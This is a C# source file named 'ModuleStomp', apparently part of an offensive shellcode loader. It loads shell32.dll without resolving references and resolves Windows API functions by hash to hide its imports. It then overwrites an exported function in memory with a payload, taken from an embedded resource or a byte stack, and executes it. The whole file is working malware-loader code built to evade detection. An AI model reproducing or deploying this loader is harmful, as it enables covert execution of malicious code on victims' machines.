using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ModuleStomp
{
    class Execute
    {
        public static byte[] buf;
        public static uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;
        
        public static void exec()
        {
            ByteORRaw();
            var modulname = "shell32.dll";
            MLoadLibraryExW(modulname, IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
            Stomp(buf);

        }


        public static IntPtr MLoadLibraryExW(string lpFileName, IntPtr hReservedNull, uint dwFlags)
        {
            IntPtr expfunc = Dinvoke.GetExpAddressByHASH(Dinvoke.GetModuleAddress(@"kernel32.dll"), "ba1766ef");
            DLoadLibraryExW MDLoadLibraryExW = (DLoadLibraryExW)Marshal.GetDelegateForFunctionPointer(expfunc, typeof(DLoadLibraryExW));
            return MDLoadLibraryExW(lpFileName, hReservedNull, dwFlags);
        }
        public static bool MWPM(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten)
        {
            IntPtr expfunc = Dinvoke.GetExpAddressByHASH(Dinvoke.GetModuleAddress(@"kernel32.dll"), "5e4a59cb");
            DWPM MDWPM = (DWPM)Marshal.GetDelegateForFunctionPointer(expfunc, typeof(DWPM));
            return MDWPM(hProcess, lpBaseAddress, lpBuffer, nSize, out lpNumberOfBytesWritten);
        }

        public static void Stomp(byte[] code)
        {

            IntPtr expfunc = Dinvoke.GetExpAddressByHASH(Dinvoke.GetModuleAddress(@"shell32.dll"), "63b09c13");
            UIntPtr ptr;
            MWPM(Process.GetCurrentProcess().Handle, expfunc, code, (uint)code.Length, out ptr);
            Exec exec = (Exec)Marshal.GetDelegateForFunctionPointer(expfunc, typeof(Exec));
            exec();

        }
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool Exec();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool DWPM(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr DLoadLibraryExW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, IntPtr hReservedNull, uint dwFlags);

        public static byte[] GetEmbeddedBin(string resourcesName)
        {

            var EmbeddedRes = Assembly.GetExecutingAssembly();
            using (var rs = EmbeddedRes.GetManifestResourceStream(resourcesName))
            {
                if (rs != null)
                {
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        return ms.ToArray();
                    }
                }
                else
                {
                    return null;
                }

            }
        }
        public static void ByteORRaw() 
        {
            if (GetCode.UseRaw == true)
            {
                buf = GetEmbeddedBin("dotnetlib");

            }
            else
            {
                //3d4f0f8e
                Stack<byte> recvStack = GetCode.CodeStack();
                buf = new byte[recvStack.Count];
                int payloadLen = recvStack.Count;
                for (int i = 0; i <= payloadLen; i++)
                {
                    try
                    {
                        buf[i] = recvStack.Pop();
                    }
                    catch { break; }

                }
            }


        }
    }
}
